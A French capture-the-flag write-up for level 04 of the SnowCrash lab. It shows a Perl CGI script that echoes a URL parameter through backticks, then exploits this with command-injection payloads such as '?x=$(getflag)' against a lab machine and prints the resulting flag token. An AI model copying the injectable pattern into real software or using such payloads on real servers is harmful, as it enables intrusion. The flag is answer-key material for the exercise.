# LEVEL 04

### Reconnaissance

En se connectant sur le compte level04, on trouve un script perl:

```
level04@SnowCrash:~$ cat level04.pl 
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
level04@SnowCrash:~$ ./level04.pl 
Content-type: text/html
```

Effectivement le port 4747 est bien en ecoute:
```
level04@SnowCrash:~$ netstat -tulpen
(No info could be read for "-p": geteuid()=2004 but you should be root.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode       PID/Program name
tcp        0      0 0.0.0.0:4242            0.0.0.0:*               LISTEN      0          12556       -               
tcp        0      0 127.0.0.1:5151          0.0.0.0:*               LISTEN      3011       12673       -               
tcp6       0      0 :::4646                 :::*                    LISTEN      0          10651       -               
tcp6       0      0 :::4747                 :::*                    LISTEN      0          10655       -               
tcp6       0      0 :::80                   :::*                    LISTEN      0          10646       -               
tcp6       0      0 :::4242                 :::*                    LISTEN      0          12558       -               
udp        0      0 0.0.0.0:68              0.0.0.0:*                           0          12114       -   
```

### Exploitation

*Pour comprendre les CGI perl --> http://www.dil.univ-mrs.fr/~chris/Documents/CGI*

En se rendant sur IP:4747 via un navigateur,on a une page blanche. Ces manipulations peuvent aussi se faire via curl.

En testant le script on voir qu'il nous renvoit ce qu'on passe en argument:
```
http://192.168.56.105:4747/?x=/bin/ls
/bin/ls
```

Testons une injection de commande:
```
http://192.168.56.105:4747/?x=$(whoami)
flag04
```

**Bingo !**

```
http://192.168.56.105:4747/?x=$(getflag)
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```

